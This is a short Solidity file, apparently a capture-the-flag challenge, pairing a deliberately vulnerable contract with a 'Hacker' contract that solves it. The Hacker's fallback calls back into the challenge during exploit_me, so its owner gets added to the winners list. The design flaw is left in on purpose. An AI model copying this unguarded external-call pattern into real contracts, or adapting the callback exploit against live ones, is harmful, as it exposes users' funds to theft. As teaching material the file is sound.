// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract Challenge{

    address[] public winners;
    bool lock;

    function exploit_me(address winner) public{
        lock = false;

        msg.sender.call("");

        require(lock, "Not Lock!");
        winners.push(winner);
    }

    function lock_me() public{
        lock = true;
    }
}

interface IChallenge {
    function exploit_me(address winner) external;
    function lock_me() external;
}

contract Hacker{
    address public Owner;
    IChallenge public challenge;

    constructor(address _challenge){
        Owner = msg.sender;
        challenge = IChallenge(_challenge);
    }
    function Hack()
    external 
    {
        challenge.exploit_me(Owner);
    }
    fallback () external {
        challenge.lock_me();
    }    
}